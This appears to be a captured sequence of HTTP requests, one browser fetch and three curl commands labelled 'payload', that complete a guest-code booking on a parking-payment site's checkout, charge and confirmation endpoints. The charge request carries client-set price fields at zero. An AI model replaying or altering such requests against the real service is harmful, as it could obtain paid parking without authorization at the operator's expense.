## request
```javascript
fetch("https://paid.parkeaz.com/checkout", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    "priority": "u=0, i",
    "sec-ch-ua": "\"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "cookie": "PHPSESSID=<REDACTED>"
  },
  "body": "tenant=&spacenumber=&mobile=&email=&firstname=&lastname=&vehiclemake=&vehiclemodel=&vehiclecolor=&vehiclestate=&couponcode=&guestcode=&postalcode=&product=3615&guestcode=<GUEST_CODE>&couponcode=&mobile=5555555555&email=user%40example.com&firstname=Jane&lastname=Doe&vehiclemake=&vehiclemodel=&vehiclecolor=&zone=622&zoneid=247&propertyid=202&plate=ABC1234&parkstart=2026-03-27+14%3A11%3A07&extension=0",
  "method": "POST"
});
```

## payload
```bash
curl 'https://paid.parkeaz.com/checkout' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cache-control: max-age=0' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -b 'PHPSESSID=<REDACTED>' \
  -H 'origin: null' \
  -H 'priority: u=0, i' \
  -H 'sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "macOS"' \
  -H 'sec-fetch-dest: document' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-user: ?1' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36' \
  --data-raw 'tenant=&spacenumber=&mobile=&email=&firstname=&lastname=&vehiclemake=&vehiclemodel=&vehiclecolor=&vehiclestate=&couponcode=&guestcode=&postalcode=&product=3615&guestcode=<GUEST_CODE>&couponcode=&mobile=5555555555&email=user%40example.com&firstname=Jane&lastname=Doe&vehiclemake=&vehiclemodel=&vehiclecolor=&zone=622&zoneid=247&propertyid=202&plate=ABC1234&parkstart=2026-03-27+14%3A11%3A07&extension=0'
```

```bash
curl 'https://paid.parkeaz.com/charge' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cache-control: max-age=0' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -b 'PHPSESSID=<REDACTED>' \
  -H 'origin: null' \
  -H 'priority: u=0, i' \
  -H 'sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "macOS"' \
  -H 'sec-fetch-dest: document' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-user: ?1' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36' \
  --data-raw 'parkstart=2026-03-27+14%3A11%3A07&parkend=2026-03-27+16%3A11%3A07&zone=622&zoneid=247&propertyid=202&propertyname=Ponce+Springs+Lofts&plate=ABC1234&tenantid=&email=user%40example.com&mobile=5555555555&parkallowtextalert=On&spacenumber=&firstname=Jane&lastname=Doe&vehiclemake=&vehiclemodel=&vehiclecolor=&vehiclestate=&product=3615&producttime=120&couponid=0&coupondiscount=0&couponpriceadded=0&productprice=0.00&transactionfee=0&totalcharge=0&stripeprice=0&extension=0&guestcode=<GUEST_CODE>'
```

```bash
curl 'https://paid.parkeaz.com/successful_transaction?parkid=1234567&zone=622&remember=0' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cache-control: max-age=0' \
  -b 'PHPSESSID=<REDACTED>; plate=ABC1234; lastname=Doe; firstname=Jane; mobile=5555555555; email=user%40example.com; postalcode=00000' \
  -H 'priority: u=0, i' \
  -H 'sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "macOS"' \
  -H 'sec-fetch-dest: document' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-user: ?1' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36'
```